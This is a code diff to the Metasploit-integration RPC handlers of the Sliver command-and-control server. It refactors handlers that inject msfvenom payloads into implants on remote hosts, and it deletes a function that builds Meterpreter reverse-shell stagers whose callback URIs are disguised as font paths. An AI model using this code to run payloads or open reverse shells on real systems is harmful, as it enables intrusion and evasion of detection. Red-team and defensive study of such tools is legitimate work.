@@ -20,24 +20,18 @@ package rpc
 
 import (
 	"context"
-	"errors"
-	"fmt"
-	"math/rand"
-	"path"
-	"time"
 
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/server/core"
 	"github.com/bishopfox/sliver/server/db"
-	"github.com/bishopfox/sliver/server/generate"
 	"github.com/bishopfox/sliver/server/log"
 	"github.com/bishopfox/sliver/server/msf"
 )
 
 var (
-	msfLog = log.NamedLogger("rcp", "msf")
+	msfLog = log.NamedLogger("rpc", "msf")
 )
 
 // Msf - Helper function to execute MSF payloads on the remote system
@@ -64,7 +58,7 @@ func (rpc *Server) Msf(ctx context.Context, req *clientpb.MSFReq) (*sliverpb.Tas
 		arch = beacon.Arch
 	}
 
-	config := msf.VenomConfig{
+	rawPayload, err := msf.VenomPayload(msf.VenomConfig{
 		Os:         os,
 		Arch:       msf.Arch(arch),
 		Payload:    req.Payload,
@@ -73,8 +67,7 @@ func (rpc *Server) Msf(ctx context.Context, req *clientpb.MSFReq) (*sliverpb.Tas
 		Encoder:    req.Encoder,
 		Iterations: int(req.Iterations),
 		Format:     "raw",
-	}
-	rawPayload, err := msf.VenomPayload(config)
+	})
 	if err != nil {
 		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
 		return nil, err
@@ -83,6 +76,7 @@ func (rpc *Server) Msf(ctx context.Context, req *clientpb.MSFReq) (*sliverpb.Tas
 		Encoder:  "raw",
 		Data:     rawPayload,
 		RWXPages: true,
+		Request:  req.Request,
 	}
 	resp := &sliverpb.Task{Response: &commonpb.Response{}}
 	err = rpc.GenericHandler(taskReq, resp)
@@ -115,7 +109,8 @@ func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*
 		os = beacon.OS
 		arch = beacon.Arch
 	}
-	config := msf.VenomConfig{
+
+	rawPayload, err := msf.VenomPayload(msf.VenomConfig{
 		Os:         os,
 		Arch:       msf.Arch(arch),
 		Payload:    req.Payload,
@@ -124,8 +119,7 @@ func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*
 		Encoder:    req.Encoder,
 		Iterations: int(req.Iterations),
 		Format:     "raw",
-	}
-	rawPayload, err := msf.VenomPayload(config)
+	})
 	if err != nil {
 		return nil, err
 	}
@@ -134,6 +128,7 @@ func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*
 		Encoder:  "raw",
 		Data:     rawPayload,
 		RWXPages: true,
+		Request:  req.Request,
 	}
 	resp := &sliverpb.Task{Response: &commonpb.Response{}}
 	err = rpc.GenericHandler(taskReq, resp)
@@ -141,93 +136,4 @@ func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*
 		return nil, err
 	}
 	return resp, nil
-}
-
-// MsfStage - Generate a MSF compatible stage
-func (rpc *Server) MsfStage(ctx context.Context, req *clientpb.MsfStagerReq) (*clientpb.MsfStager, error) {
-	var (
-		MSFStage = &clientpb.MsfStager{
-			File: &commonpb.File{},
-		}
-		payload string
-		arch    string
-		uri     string
-	)
-
-	switch req.GetArch() {
-	case "amd64":
-		arch = "x64"
-	default:
-		arch = "x86"
-	}
-
-	switch req.Protocol {
-	case clientpb.StageProtocol_TCP:
-		payload = "meterpreter/reverse_tcp"
-	case clientpb.StageProtocol_HTTP:
-		payload = "meterpreter/reverse_http"
-		uri = generateCallbackURI()
-	case clientpb.StageProtocol_HTTPS:
-		payload = "meterpreter/reverse_https"
-		uri = generateCallbackURI()
-	default:
-		return MSFStage, errors.New("protocol not supported")
-	}
-
-	// We only support windows at the moment
-	if req.GetOS() != "windows" {
-		return MSFStage, fmt.Errorf("%s is currently not supported", req.GetOS())
-	}
-
-	venomConfig := msf.VenomConfig{
-		Os:       req.GetOS(),
-		Payload:  payload,
-		LHost:    req.GetHost(),
-		LPort:    uint16(req.GetPort()),
-		Arch:     arch,
-		Format:   req.GetFormat(),
-		BadChars: req.GetBadChars(), // TODO: make this configurable
-		Luri:     uri,
-	}
-
-	stage, err := msf.VenomPayload(venomConfig)
-	if err != nil {
-		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
-		return MSFStage, err
-	}
-	MSFStage.File.Data = stage
-	name, err := generate.GetCodename()
-	if err != nil {
-		return MSFStage, err
-	}
-	MSFStage.File.Name = name
-	return MSFStage, nil
-}
-
-// Utility functions
-func generateCallbackURI() string {
-	segments := []string{"static", "assets", "fonts", "locales"}
-	// Randomly picked font while browsing on the web
-	fontNames := []string{
-		"attribute_text_w01_regular.woff",
-		"ZillaSlab-Regular.subset.bbc33fb47cf6.woff",
-		"ZillaSlab-Bold.subset.e96c15f68c68.woff",
-		"Inter-Regular.woff",
-		"Inter-Medium.woff",
-	}
-	return path.Join(randomPath(segments, fontNames)...)
-}
-
-func randomPath(segments []string, filenames []string) []string {
-	seed := rand.NewSource(time.Now().UnixNano())
-	insecureRand := rand.New(seed)
-	n := insecureRand.Intn(3) // How many segments?
-	genSegments := []string{}
-	for index := 0; index < n; index++ {
-		seg := segments[insecureRand.Intn(len(segments))]
-		genSegments = append(genSegments, seg)
-	}
-	filename := filenames[insecureRand.Intn(len(filenames))]
-	genSegments = append(genSegments, filename)
-	return genSegments
 }
